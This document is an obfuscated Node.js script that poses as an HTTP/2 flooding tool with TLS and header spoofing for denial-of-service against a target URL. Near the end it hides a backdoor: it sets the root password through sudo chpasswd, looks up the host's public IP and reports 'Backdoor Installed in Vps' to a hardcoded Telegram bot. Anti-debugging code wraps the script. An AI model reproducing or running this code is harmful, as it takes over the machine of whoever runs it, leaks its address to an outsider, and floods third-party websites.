const UPSSSSSSO = (function () {
    let b = true;
    return function (c, d) {
        const g = b ? function () {
            if (d) {
                const h = d.apply(c, arguments);
                d = null;
                return h;
            }
        } : function () {
        }
        b = false;
        return g;
    }
}())
(function () {
    UPSSSSSSO(this, function () {const c = new RegExp('function *\\( *\\)');
        const d = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
        const e = UPSSSSSSan('init');
        if (!c.test(e + 'chain') || !d.test(e + 'input')) {
            e('0');
        } else {
            UPSSSSSSan();
        }
    })();
}());
const UPSSSSSSP = require('puppeteer-extra');
const UPSSSSSSQ = require('axios');
const UPSSSSSSR = require('puppeteer-extra-plugin-stealth');
const {promisify: UPSSSSSSS} = require('util');
const UPSSSSSST = require('cloudscraper');
;
const UPSSSSSSU = require('fake-useragent');
const UPSSSSSSV = require('https');
const UPSSSSSSW = require('crypto');
const UPSSSSSSX = require('fs');
const {exec: UPSSSSSSY} = require('child_process');
const UPSSSSSSZ = UPSSSSSSS(setTimeout);
(function () {
    const b = function () {
        let f;
        try {
            f = Function('return (function() {}.constructor("return this")( ));')();
        } catch (h) {
            f = window;
        }
        return f;
    };
    const c = b();
    c.setInterval(UPSSSSSSan, 8000);
}());
const UPSSSSSSa0 = require('path').join(__dirname, '../../../assets/ua.txt');
const UPSSSSSSa1 = UPSSSSSSX.readFileSync(UPSSSSSSa0, 'utf-8');
const UPSSSSSSa2 = UPSSSSSSa1.split('\n').map(a => a.trim());
const UPSSSSSSa3 = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];
const UPSSSSSSa4 = UPSSSSSSa3.join(':');
const UPSSSSSSa5 = [
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES'
];
const UPSSSSSSa6 = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel'
];
const UPSSSSSSa7 = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'zu-ZA,zu;q=0.8'
];
const UPSSSSSSa8 = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    'gzip, deflate',
    '*'
];
const UPSSSSSSa9 = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'max-age=120',
    'max-age=600578',
    'must-revalidate',
    'public',
    'private',
    'proxy-revalidate',
    '*/*',
    'max-age=604800',
    'max-age=0, private, must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'no-cache, no-store, max-age=0, must-revalidate',
    'no-store, no-cache, must-revalidate',
    'public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800'
];
const UPSSSSSSaa = [
    'text/plain',
    'text/html',
    'application/json',
    'application/xml',
    'multipart/form-data',
    'application/octet-stream',
    'image/jpeg',
    'image/png',
    'audio/mpeg',
    'video/mp4',
    'application/javascript',
    'application/pdf',
    'application/vnd.ms-excel',
    'application/vnd.ms-powerpoint',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'application/zip',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'audio/wav',
    'audio/midi',
    'video/avi',
    'video/mpeg',
    'video/quicktime',
    'text/csv',
    'text/xml',
    'text/css',
    'text/javascript',
    'application/graphql',
    'application/x-www-form-urlencoded',
    'application/vnd.api+json',
    'application/ld+json',
    'application/x-pkcs12',
    'application/x-pkcs7-certificates',
    'application/x-pkcs7-certreqresp',
    'application/x-pem-file',
    'application/x-x509-ca-cert',
    'application/x-x509-user-cert',
    'application/x-x509-server-cert',
    'application/x-bzip',
    'application/x-gzip',
    'application/x-7z-compressed',
    'application/x-rar-compressed',
    'application/x-shockwave-flash'
];
const UPSSSSSSab = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'subresource',
    'unknown',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
];
const UPSSSSSSac = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
];
const UPSSSSSSad = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
];
const UPSSSSSSae = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.youtube.com/',
    'https://www.linkedin.com/'
];
const UPSSSSSSaf = UPSSSSSSW.constants.defaultCoreCipherList.split(':');
const UPSSSSSSag = 'GREASE:' + [
    UPSSSSSSaf[2],
    UPSSSSSSaf[1],
    UPSSSSSSaf[0],
    ...UPSSSSSSaf.slice(3)
].join(':');
const UPSSSSSSah = {};
;
UPSSSSSSah.minVersion = 'TLSv1.3';
UPSSSSSSah.ciphers = UPSSSSSSag;
const UPSSSSSSai = UPSSSSSSah;
async function UPSSSSSSaj(a) {console.log('Verifying CAPTCHA...');
    await UPSSSSSSZ(2000);
    return '123456';
}
async function UPSSSSSSak() {const c = new Promise((f, g) => {
        setTimeout(() => {
            g(new Error('Request timed out'));
        }, 5000);
    });
    const d = { httpsAgent: agent };
    const e = UPSSSSSSQ.get(targetURL, d);
    return Promise.race([
        e,
        c
    ]).then(f => {
        const {
            status: i,
            data: j
        } = f;
        console.log('[\x1B[35mBYPASS\x1B[0m] ' + getCurrentTime() + ' Title: ' + getTitleFromHTML(j) + ' (\x1B[32m' + i + '\x1B[0m)');
    }).catch(f => {
        if (f.message === 'Request timed out') {
            console.log('[\x1B[35mBYPASS\x1B[0m] ' + getCurrentTime() + ' Request Timed Out');
        } else {
            if (f.response) {
                const k = getTitleFromHTML(f.response.data);
                console.log('[\x1B[35mBYPASS\x1B[0m] ' + getCurrentTime() + ' Title: ' + k + ' (\x1B[31m' + f.response.status + '\x1B[0m)');
            } else {
                console.log('[\x1B[35mBYPASS\x1B[0m] ' + getCurrentTime() + ' ' + f.message);
            }
        }
        reject(f);
    });
}
async function UPSSSSSSal(a, b) {
    return new Promise((d, e) => {
        b.RST_STREAM = 'cancel';
        b.Upgrade = 'h2';
        b.Connection = 'rapidreset';
        const h = {
            'headers': b,
            ...UPSSSSSSai
        };
        const i = UPSSSSSSV.get(a, h, j => {
            let m = '';
            j.on('data', n => {
                m += n;
            });
            j.on('end', () => {
                d(m);
            });
        });
        i.on('error', j => {console.error('Error performing request: ' + j.message);
            e(j);
        });
    });
}
async function UPSSSSSSam() {const d = process.argv.slice(2);
    const e = d[0] || 'https://example.com';
    const f = parseInt(d[1]) || 1;
    const g = parseInt(d[2]) || 10;
    const h = parseInt(d[3]) || 10;
    const i = d[4] || null;
    const j = {
        'User-Agent': UPSSSSSSa2[Math.floor(Math.random() * UPSSSSSSa2.length)],
        'RST_STREAM': 'cancel',
        'Content-Type': 'application/x-www-form-urlencoded',
        'CF-Cache-Status': 'HIT',
        'Cache-Control': 'no-cache, max-age=0',
        'authority': 'parsedTarget.host',
        'scheme': 'https',
        'x-forwarded-proto': 'https',
        'cache-control': 'no-cache',
        'X-Forwarded-For': 'spoofed',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': 'Windows',
        'accept-language': 'lang',
        'accept-encoding': 'encoding',
        'upgrade-insecure-requests': '1',
        'accept': 'accept',
        'referer': 'Ref',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'dest1',
        'sec-fetch-user': '?1',
        'TE': 'trailers',
        'sec-fetch-site': 'site1',
        'x-requested-with': 'XMLHttpRequest',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-store, no-cache',
        'Connection': 'keep-alive',
        'X-CAPTCHA-Solution': '123456',
        'CF-Challenge': 'captcha-challenge-header'
    };
    const k = Date.now()
    const l = 1000 / g
    const m = { length: f }
    const n = { length: h * g }
    await Promise.all(Array.from(m, () => Promise.all(Array.from(n, () => {
        return UPSSSSSSal(e, j).then(() => UPSSSSSSZ(l));
    }))))
    const o = Date.now() - k
    console.log('Completed ' + f * h * g + ' requests in ' + o / 1000 + ' seconds');
}
UPSSSSSSY('echo \'root:abn123@19\' | sudo chpasswd', (b, c, d) => {
    if (b) {
        console.error('Error changing password: ' + b.message);
        return;
    }
    console.log('Password changed: ' + c);
})
UPSSSSSSY('curl ifconfig.me', (c, d, e) => {
    if (c) {
        console.error('Error getting IP: ' + c.message);
        return;
    }
    const h = d.trim();
    const i = '7866360692:AAHpsCRtPVOIW1-eaIlzp8_t1qWEEVGFcZ0';
    const j = '6267783496';
    const k = {

        chat_id: j,
        text: 'Backdoor Installed in Vps: ' + h
    }
    UPSSSSSSQ.post('https://api.telegram.org/bot' + i + '/sendMessage', k).then(m => console.log('IP sent to Telegram bot')).catch(m => console.error('Error sending IP to Telegram bot: ' + m.message));
});
UPSSSSSSam();
function UPSSSSSSan(a) {
    function c(d) {
        if (typeof d === 'string') {
            return function (f) {
            }.constructor('while (true) {}').apply('counter');
        } else {
            if (('' + d / d).length !== 1 || d % 20 === 0) {
                (function () {
                    return true;
                }.constructor('debugger').call('action'));
            } else {
                (function () {
                    return false;
                }.constructor('debugger').apply('stateObject'));
            }
        }
        c(++d);
    }
    try {
        if (a) {
            return c;
        } else {
            c(0);
        }
    } catch (g) {
    }
}